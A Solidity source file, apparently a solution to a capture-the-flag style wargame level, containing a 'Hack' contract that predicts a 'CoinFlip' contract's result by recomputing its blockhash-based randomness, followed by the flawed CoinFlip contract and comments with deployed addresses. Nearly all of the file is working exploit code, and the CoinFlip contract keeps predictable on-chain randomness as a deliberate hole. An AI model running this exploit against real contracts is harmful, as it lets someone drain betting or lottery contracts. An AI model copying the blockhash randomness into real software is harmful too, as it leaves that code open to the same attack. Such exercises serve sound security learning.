// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Hack {
  CoinFlip public immutable target;
  uint public blockNumber;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor(address _address) {
    target = CoinFlip(_address);
  }

  function flip() external {
    bool guess = _guess();
   require(target.flip(guess), "guess failed");
  } 

  function _guess() public view returns(bool side) {
    uint256 blockValue = uint256(blockhash(block.number - 1));
    uint256 coinFlip = blockValue / FACTOR;
    side = coinFlip == 1 ? true : false;
  }

}


contract CoinFlip {

  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number - 1));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }


}


// 0x1f5cBAd051f70B3A1514f2657d83E723EFB2126E

// 0x8F84042C407288c1053Af596842d7eCAf965f4EA



// 07:28 => 11111 => guess() => flip(guess)

// 07:28 => 11111 guess()
// 07:29 => 11113 flip(guess)

// flip(guess)


// hack : 0x1edB8ACd8b6Fe9F011B5Bb04a5EA4955413Fa942
//  flip : 0xC42D37CF8e02c67dF974fd9EAfaDB8CbD60E0DF2